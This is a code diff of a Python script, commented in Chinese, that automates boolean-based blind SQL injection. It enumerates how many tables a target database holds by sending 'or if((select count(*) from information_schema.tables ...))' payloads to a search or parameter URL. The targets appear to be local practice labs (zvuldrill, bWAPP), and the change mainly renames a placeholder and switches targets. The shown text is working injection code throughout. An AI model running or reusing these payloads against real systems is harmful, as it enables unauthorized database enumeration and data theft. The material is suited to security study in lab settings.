@@ -9,6 +9,7 @@ from data import glovar
 
 def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
                 dbname='zvuldrill'):
+
     response_length = 0
 
     hex_dbname = ""
@@ -18,17 +19,17 @@ def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sea
 
     hex_dbname = '0x' + hex_dbname.replace('0x', '')
 
-    # 查数据库test中表的个数基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
+    # 查数据库test中表的个数 基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
     if type == 'int':
-        payload = '+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)'
+        payload = '+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={tbcount},1,0)'
     elif type == 'string':
-        payload = '\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)%23'
+        payload = '\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={tbcount},1,0)%23'
     elif type == 'search':
-        payload = '%\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)%23'
+        payload = '%\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={tbcount},1,0)%23'
 
     for i in range(0, 30):
 
-        full_payload = url + payload.format(ascii_number=str(i))
+        full_payload = url + payload.format(tbcount=str(i))
 
         url_response = urllib.request.Request(full_payload)
 
@@ -46,6 +47,6 @@ def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sea
 
 if __name__ == "__main__":
 
-    get_tbcount(url=glovar.url3)
+    #get_tbcount(url=glovar.url3)
 
-    #get_tbcount(url=glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp')
+    get_tbcount(url=glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp')
